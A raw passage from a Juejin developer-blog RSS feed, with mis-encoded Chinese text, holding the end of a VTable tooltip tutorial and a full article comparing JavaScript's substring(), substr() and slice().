    <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
    <span class="hljs-comment">/* è¾¹æ¡†å®½åº¦ï¼šä¸Š4px | å³4px | ä¸‹4px | å·¦0ï¼ˆä»…å³è¾¹æ¡†æœ‰å®½åº¦ï¼‰ */</span>
    <span class="hljs-attribute">border-width</span>: <span class="hljs-number">4px</span> <span class="hljs-number">4px</span> <span class="hljs-number">4px</span> <span class="hljs-number">0</span>;
    <span class="hljs-attribute">border-style</span>: solid;
    <span class="hljs-comment">/* è¾¹æ¡†é¢œè‰²ï¼šä¸Šé€æ˜ | å³ç°è‰² | ä¸‹é€æ˜ | å·¦é€æ˜ï¼ˆä»…å³è¾¹æ¡†æ˜¾ç¤ºï¼‰ */</span>
    <span class="hljs-attribute">border-color</span>: transparent <span class="hljs-number">#333</span> transparent transparent;
    <span class="hljs-comment">/* æ¶ˆé™¤é»˜è®¤ç©ºç™½ï¼ˆé¿å…å­—ä½“/è¡Œé«˜å¯¼è‡´çš„é—´éš™ï¼‰ */</span>
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">left</span>: -<span class="hljs-number">6px</span>;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">margin</span>: auto;
    <span class="hljs-attribute">position</span>: absolute;
  }
}
</code></pre>
<h4 data-id="heading-8">3.2.2 ç›‘å¬å¹¶ä¸”å±•ç¤ºè‡ªå®šä¹‰æ°”æ³¡</h4>
<pre><code class="hljs language-Typescript" lang="Typescript">tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-string">'click_cell'</span>, <span class="hljs-function">(<span class="hljs-params">args: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
    <span class="hljs-comment">// å…ˆæŠŠæ—§çš„æ°”æ³¡å¹²æ‰</span>
    tooltipTxt.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;

    <span class="hljs-keyword">const</span> { col, row, value } = args;

    <span class="hljs-comment">// è¿‡æ»¤éæ•°æ®è¡Œ</span>
    <span class="hljs-keyword">if</span> (col &lt; <span class="hljs-number">0</span> || row &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æº¢å‡º</span>
    <span class="hljs-keyword">const</span> isOverflow = <span class="hljs-title function_">isCellTextOverflow</span>(tableInstance, col, row, value);

    <span class="hljs-keyword">if</span> (!isOverflow) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 1. è·å–åˆ—å®½</span>
    <span class="hljs-keyword">const</span> colWidth = tableInstance.<span class="hljs-title function_">getColWidth</span>(col);
    <span class="hljs-comment">// 1. è·å–åˆ—é«˜</span>
    <span class="hljs-keyword">const</span> colHeight = tableInstance.<span class="hljs-title function_">getRowHeight</span>(col);

    <span class="hljs-keyword">const</span> { offsetX, offsetY } = args.<span class="hljs-property">event</span>;
    left.<span class="hljs-property">value</span> = offsetX - colWidth * <span class="hljs-number">0.2</span> + <span class="hljs-string">'px'</span>;
    top.<span class="hljs-property">value</span> = offsetY - colHeight / <span class="hljs-number">2</span> + <span class="hljs-string">'px'</span>;
    tooltipTxt.<span class="hljs-property">value</span> = value;
});
</code></pre>
<h4 data-id="heading-9">3.2.3 ç›‘å¬ç‚¹å‡»/æ»šåŠ¨äº‹ä»¶ éšè—æ°”æ³¡</h4>
<pre><code class="hljs language-Typescript" lang="Typescript"><span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">TABLE_EVENT_TYPE</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vtable'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">hideTooltip</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (tooltipTxt.<span class="hljs-property">value</span>) {
    tooltipTxt.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
  }
};

<span class="hljs-keyword">const</span> tableInstance = tableRef.<span class="hljs-property">value</span>?.<span class="hljs-property">table</span>;<span class="hljs-keyword">const</span> tableInstance = tableRef.<span class="hljs-property">value</span>?.<span class="hljs-property">table</span>;

tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">SCROLL</span>, hideTooltip);
tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">RESIZE_COLUMN</span>, hideTooltip);
<span class="hljs-comment">// ç›‘å¬æ ‘å½¢ç»“æ„å˜åŒ–ï¼ˆå±•å¼€/æŠ˜å è§¦å‘æ—¶ä¹Ÿå¼ºåˆ¶å…³æ‰ï¼ŒåŒé‡ä¿é™©ï¼‰</span>
tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">TREE_HIERARCHY_STATE_CHANGE</span>, hideTooltip);
<span class="hljs-comment">// å¦‚æœä½ ç”¨äº†è‡ªåŠ¨é«˜åº¦çš„æ–¹æ¡ˆï¼Œå»ºè®®ä¹Ÿç›‘å¬ UPDATED</span>
tableInstance.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">TABLE_EVENT_TYPE</span>.<span class="hljs-property">UPDATED</span>, hideTooltip);

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, hideTooltip, <span class="hljs-literal">true</span>);
});

<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, hideTooltip, <span class="hljs-literal">true</span>);
});
</code></pre>
<h2 data-id="heading-10">4. æ€»ç»“</h2>
<p>æä¾›çš„ä¸¤ä¸ªè§£å†³æ€è·¯æ€§èƒ½æ¶ˆè€—éƒ½ä¸å¤§ï¼Œéƒ½å¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[substringå’Œsubstræœ‰ä»€ä¹ˆåŒºåˆ«]]></title>    <link>https://juejin.cn/post/7592531796039942178</link>    <guid>https://juejin.cn/post/7592531796039942178</guid>    <pubDate>2026-01-07T14:53:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796039942178" data-draft-id="7592531796039909410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="substringå’Œsubstræœ‰ä»€ä¹ˆåŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T14:53:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            substringå’Œsubstræœ‰ä»€ä¹ˆåŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:53:09.000Z" title="Wed Jan 07 2026 14:53:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>substring()</code>Â å’ŒÂ <code>substr()</code>Â éƒ½æ˜¯ç”¨äºæˆªå–å­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œä½†å®ƒä»¬åœ¨å‚æ•°å«ä¹‰å’Œè¡Œä¸ºä¸Šæœ‰é‡è¦åŒºåˆ«ã€‚<strong><code>substr()</code>Â ç°å·²åºŸå¼ƒ</strong>ï¼Œä¸å»ºè®®åœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-0">ä¸»è¦åŒºåˆ«å¯¹æ¯”è¡¨</h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th><code>substring(start, end)</code></th><th><code>substr(start, length)</code></th></tr></thead><tbody><tr><td><strong>å‚æ•°å«ä¹‰</strong></td><td>start: èµ·å§‹ç´¢å¼• end: ç»“æŸç´¢å¼•</td><td>start: èµ·å§‹ç´¢å¼• length: è¦æˆªå–çš„å­—ç¬¦æ•°</td></tr><tr><td><strong>ç»“æŸå‚æ•°</strong></td><td>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç»“æŸç´¢å¼•ï¼ˆä¸åŒ…å«ï¼‰</td><td>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æˆªå–çš„é•¿åº¦</td></tr><tr><td><strong>è´Ÿæ•°å‚æ•°</strong></td><td>å°†è´Ÿæ•°è½¬æ¢ä¸º 0</td><td>è´Ÿæ•° start: ä»å­—ç¬¦ä¸²æœ«å°¾å€’æ•° è´Ÿæ•° length: è¿”å›ç©ºå­—ç¬¦ä¸²</td></tr><tr><td><strong>å‚æ•°é¡ºåº</strong></td><td>å¦‚æœ start &gt; endï¼Œä¼šè‡ªåŠ¨äº¤æ¢å‚æ•°</td><td>ä¸ä¼šäº¤æ¢å‚æ•°</td></tr><tr><td><strong>ECMAScript çŠ¶æ€</strong></td><td><strong>æ¨èä½¿ç”¨</strong></td><td><strong>å·²åºŸå¼ƒ</strong>Â (ä¸æ¨èä½¿ç”¨)</td></tr><tr><td><strong>æ›¿ä»£æ–¹æ¡ˆ</strong></td><td>æœ¬èº«å¯ç”¨</td><td>ä½¿ç”¨Â <code>slice()</code>Â æˆ–Â <code>substring()</code></td></tr></tbody></table>
<h2 data-id="heading-1">è¯¦ç»†è¯´æ˜</h2>
<h3 data-id="heading-2"><code>substring(startIndex, endIndex)</code></h3>
<ul>
<li><strong>å‚æ•°</strong>ï¼š
<ul>
<li><code>startIndex</code>ï¼šå¿…éœ€ï¼Œèµ·å§‹ä½ç½®ï¼ˆåŒ…å«ï¼‰</li>
<li><code>endIndex</code>ï¼šå¯é€‰ï¼Œç»“æŸä½ç½®ï¼ˆä¸åŒ…å«ï¼‰</li>
</ul>
</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š
<ul>
<li>å¦‚æœçœç•¥Â <code>endIndex</code>ï¼Œåˆ™æˆªå–åˆ°å­—ç¬¦ä¸²æœ«å°¾</li>
<li>å¦‚æœä»»ä¸€å‚æ•°ä¸ºè´Ÿæ•°ï¼Œä¼šè¢«å½“ä½œ 0 å¤„ç†</li>
<li>å¦‚æœÂ <code>startIndex &gt; endIndex</code>ï¼Œä¼šè‡ªåŠ¨äº¤æ¢ä¸¤ä¸ªå‚æ•°</li>
<li>å¦‚æœå‚æ•°æ˜¯Â <code>NaN</code>ï¼Œä¼šè¢«å½“ä½œ 0</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"Hello World"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">6</span>));      <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">6</span>, <span class="hljs-number">11</span>));  <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">6</span>, <span class="hljs-number">7</span>));   <span class="hljs-comment">// "W"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>));   <span class="hljs-comment">// "Hel" (å‚æ•°è‡ªåŠ¨äº¤æ¢)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(-<span class="hljs-number">3</span>));     <span class="hljs-comment">// "Hello World" (è´Ÿæ•°å˜0)</span>
</code></pre>
<h3 data-id="heading-3"><code>substr(startIndex, length)</code>Â âŒï¼ˆå·²åºŸå¼ƒï¼‰</h3>
<ul>
<li><strong>å‚æ•°</strong>ï¼š
<ul>
<li><code>startIndex</code>ï¼šå¿…éœ€ï¼Œèµ·å§‹ä½ç½®</li>
<li><code>length</code>ï¼šå¯é€‰ï¼Œè¦æˆªå–çš„å­—ç¬¦æ•°</li>
</ul>
</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š
<ul>
<li><code>startIndex</code>Â å¯ä»¥æ˜¯è´Ÿæ•°ï¼Œè¡¨ç¤ºä»å­—ç¬¦ä¸²æœ«å°¾å€’æ•°</li>
<li>å¦‚æœÂ <code>length</code>Â ä¸º 0 æˆ–è´Ÿæ•°ï¼Œè¿”å›ç©ºå­—ç¬¦ä¸²</li>
<li>å¦‚æœçœç•¥Â <code>length</code>ï¼Œåˆ™æˆªå–åˆ°å­—ç¬¦ä¸²æœ«å°¾</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"Hello World"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">6</span>));       <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">6</span>, <span class="hljs-number">5</span>));    <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">6</span>, <span class="hljs-number">1</span>));    <span class="hljs-comment">// "W"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(-<span class="hljs-number">3</span>));      <span class="hljs-comment">// "rld" (ä»å€’æ•°ç¬¬3ä¸ªå¼€å§‹)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(-<span class="hljs-number">5</span>, <span class="hljs-number">2</span>));   <span class="hljs-comment">// "Wo"</span>
</code></pre>
<h2 data-id="heading-4">ç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼š<code>slice()</code></h2>
<p>ç”±äºÂ <code>substr()</code>Â å·²åºŸå¼ƒï¼Œ<strong>æ¨èä½¿ç”¨Â <code>slice()</code>Â ä½œä¸ºæ›¿ä»£</strong>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"Hello World"</span>;

<span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>));       <span class="hljs-comment">// "World"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>, <span class="hljs-number">11</span>));   <span class="hljs-comment">// "World"</span>

<span class="hljs-comment">// æ”¯æŒè´Ÿæ•°ç´¢å¼•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">5</span>));      <span class="hljs-comment">// "World" (æœ€å5ä¸ªå­—ç¬¦)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">6</span>));   <span class="hljs-comment">// "Hello" (ä»å¼€å¤´åˆ°å€’æ•°ç¬¬6ä¸ª)</span>

<span class="hljs-comment">// è´Ÿæ•°å‚æ•°è¡¨ç¤ºä»æœ«å°¾å¼€å§‹è®¡æ•°</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>, -<span class="hljs-number">1</span>));   <span class="hljs-comment">// "Worl" (ä»ç´¢å¼•6åˆ°å€’æ•°ç¬¬1ä¸ª)</span>
</code></pre>
<h2 data-id="heading-5">ä¸‰ç§æ–¹æ³•å¯¹æ¯”</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> str = <span class="hljs-string">"JavaScript"</span>;

<span class="hljs-comment">// æ­£æ•°å‚æ•°</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">4</span>, <span class="hljs-number">7</span>));  <span class="hljs-comment">// "Scr" (ç´¢å¼•4åˆ°7)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">4</span>, <span class="hljs-number">3</span>));     <span class="hljs-comment">// "Scr" (ä»ç´¢å¼•4å¼€å§‹ï¼Œå–3ä¸ªå­—ç¬¦)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span>, <span class="hljs-number">7</span>));      <span class="hljs-comment">// "Scr" (ç´¢å¼•4åˆ°7)</span>

<span class="hljs-comment">// è´Ÿæ•°å‚æ•°</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(-<span class="hljs-number">3</span>));     <span class="hljs-comment">// "JavaScript" (è´Ÿæ•°å˜0)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(-<span class="hljs-number">3</span>));        <span class="hljs-comment">// "ipt" (æœ€å3ä¸ªå­—ç¬¦)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">3</span>));         <span class="hljs-comment">// "ipt" (æœ€å3ä¸ªå­—ç¬¦)</span>

<span class="hljs-comment">// å‚æ•°äº¤æ¢</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substring</span>(<span class="hljs-number">7</span>, <span class="hljs-number">4</span>));   <span class="hljs-comment">// "Scr" (è‡ªåŠ¨äº¤æ¢ä¸º4,7)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">substr</span>(<span class="hljs-number">7</span>, <span class="hljs-number">4</span>));      <span class="hljs-comment">// "ipt" (ä»ç´¢å¼•7å–4ä¸ªï¼Œå®é™…åªæœ‰3ä¸ª)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">7</span>, <span class="hljs-number">4</span>));       <span class="hljs-comment">// "" (start&gt;endï¼Œè¿”å›ç©º)</span>
</code></pre>
<h2 data-id="heading-6">æœ€ä½³å®è·µå»ºè®®</h2>
<ol>
<li><strong>ä¸å†ä½¿ç”¨Â <code>substr()</code></strong> ï¼Œå› ä¸ºå®ƒæ˜¯å·²åºŸå¼ƒçš„æ—§æ–¹æ³•</li>
<li><strong>æ ¹æ®éœ€æ±‚é€‰æ‹©</strong>ï¼š
<ul>
<li>ä½¿ç”¨Â <code>substring()</code>ï¼šå½“éœ€è¦æ˜ç¡®çš„å¼€å§‹å’Œç»“æŸç´¢å¼•æ—¶</li>
<li>ä½¿ç”¨Â <code>slice()</code>ï¼šå½“éœ€è¦è´Ÿæ•°ç´¢å¼•åŠŸèƒ½æ—¶ï¼Œæˆ–ä½œä¸ºÂ <code>substr()</code>Â çš„æ›¿ä»£</li>
</ul>
</li>
<li><strong>è®°å¿†æŠ€å·§</strong>ï¼š
<ul>
<li><code>substring</code>ï¼šç¬¬äºŒä¸ªå‚æ•°æ˜¯"åˆ°å“ªé‡Œç»“æŸ"</li>
<li><code>substr</code>ï¼šç¬¬äºŒä¸ªå‚æ•°æ˜¯"è¦æˆªå–å¤šé•¿"ï¼ˆå·²åºŸå¼ƒï¼‰</li>
<li><code>slice</code>ï¼šç±»ä¼¼äºæ•°ç»„çš„Â <code>slice</code>Â æ–¹æ³•ï¼Œæ”¯æŒè´Ÿæ•°ç´¢å¼•</li>
</ul>
</li>
</ol>
<p>ç®€å•æ¥è¯´ï¼š<strong>è¯·ä½¿ç”¨Â <code>slice()</code>Â æˆ–Â <code>substring()</code>ï¼Œé¿å…ä½¿ç”¨Â <code>substr()</code>ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆ Vue æ¸²æŸ“åˆ—è¡¨æ—¶ï¼Œä¸èƒ½éšä¾¿ç”¨æ•°ç»„ä¸‹æ ‡å½“ keyï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592501225003909171</link>    <guid>https://juejin.cn/post/7592501225003909171</guid>    <pubDate>2026-01-07T14:57:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592501225003909171" data-draft-id="7592444642278277130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆ Vue æ¸²æŸ“åˆ—è¡¨æ—¶ï¼Œä¸èƒ½éšä¾¿ç”¨æ•°ç»„ä¸‹æ ‡å½“ keyï¼Ÿ"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-07T14:57:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆ Vue æ¸²æŸ“åˆ—è¡¨æ—¶ï¼Œä¸èƒ½éšä¾¿ç”¨æ•°ç»„ä¸‹æ ‡å½“ keyï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
